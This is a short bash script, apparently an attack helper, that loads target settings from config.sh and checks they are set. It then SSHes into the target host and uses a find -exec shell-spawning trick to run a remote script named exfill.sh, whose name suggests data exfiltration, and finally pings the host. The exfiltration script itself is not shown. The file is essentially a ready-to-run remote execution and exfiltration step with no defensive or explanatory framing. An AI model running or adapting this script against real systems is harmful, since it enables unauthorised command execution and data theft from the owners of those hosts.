#!/usr/bin/env bash

# Load shared variables from config.sh
# This expects the config.sh file to be in the same directory as this script
# ****************************************************
# *** MAKE VARIABLE CHANGES IN config.sh, NOT HERE ***
# ****************************************************
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/config.sh"

# List of required variables
required_vars=(
  TARGET_HOST
  TARGET_HOST_ROOTDIR
  TARGET_HOST_SSH_USER
  LOCAL_SSH_KEY
)

# Check each one
missing=()
for var in "${required_vars[@]}"; do
  if [ -z "${!var:-}" ]; then
    missing+=("$var")
  fi
done

if [ "${#missing[@]}" -gt 0 ]; then
  echo "Error: The following required variables are not set:" >&2
  for var in "${missing[@]}"; do
    echo "  - $var" >&2
  done
  exit 1
fi

ssh -i $LOCAL_SSH_KEY $TARGET_HOST_SSH_USER@$TARGET_HOST "/usr/bin/find . -exec /bin/sh -c $TARGET_HOST_ROOTDIR/scripts/exfill.sh \; -quit"

ping $TARGET_HOST
